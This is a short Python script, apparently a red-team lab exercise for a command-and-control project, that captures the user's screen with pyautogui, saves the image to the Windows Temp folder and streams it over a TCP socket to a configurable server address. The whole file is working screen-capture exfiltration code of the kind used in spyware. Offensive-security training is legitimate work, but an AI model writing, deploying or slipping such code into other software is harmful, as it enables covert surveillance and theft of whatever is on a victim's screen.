# from PIL import ImageGrab

# # Capture the entire screen
# screenshot = ImageGrab.grab()

# # Save the screenshot to a file
# screenshot.save("C:\\Users\\Ziya\\Desktop\\study\\AKM\\RED\\python for red\\lab\final\\Command-Control\\test\\screenshot\\screenshot.png")

# # Close the screenshot
# screenshot.close()



import pyautogui,socket,time

# print(time.ctime().split()[3])

SERVER_HOST = '127.0.0.1'  # Change this to your server's IP
SERVER_PORT = 5050

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

my_screenshot = pyautogui.screenshot()
file_name = "screenshoot_" + time.ctime().split()[3].replace(':', '-') + '.png'
print(file_name)

path = "C:\\Windows\\Temp\\" + file_name
print(path)

my_screenshot.save(path)
time.sleep(2)

file = open(path, "rb")

a = file.read(4096)
while a:
    s.send(a)
    a = file.read(4096)
time.sleep(0.3)
s.send(b"\n\r")
file.close()

print("FILE SENT!!!!")




